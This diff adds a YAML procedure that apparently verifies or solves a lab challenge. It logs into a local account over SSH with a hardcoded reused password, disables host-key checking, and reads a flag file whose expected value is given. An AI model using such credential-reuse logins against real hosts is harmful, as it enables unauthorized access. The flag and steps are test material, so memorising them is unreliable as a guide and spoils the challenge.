@@ -1,0 +1,40 @@
+procedure:
+- action:
+    command: id admin
+    type: exec_target
+  expect:
+    stdout_contains: uid=1001(admin)
+  outputs: {}
+  session: null
+  step_id: verify_admin_user_exists
+  timeout: 10
+- action:
+    command: service ssh status || ps aux | grep sshd
+    type: exec_target
+  expect:
+    stdout_contains: sshd
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'adminpass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      admin@localhost 'id'
+    type: exec_target
+  expect:
+    stdout_contains: uid=1001(admin)
+  outputs: {}
+  session: null
+  step_id: ssh_login_and_get_id
+  timeout: 15
+- action:
+    command: sshpass -p 'adminpass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      admin@localhost 'cat /home/admin/flag.txt'
+    type: exec_target
+  expect:
+    stdout_contains: FLAG{ssh_pivot_credential_reuse_success}
+  outputs: {}
+  session: null
+  step_id: read_flag_via_ssh
+  timeout: 15
+sessions: []
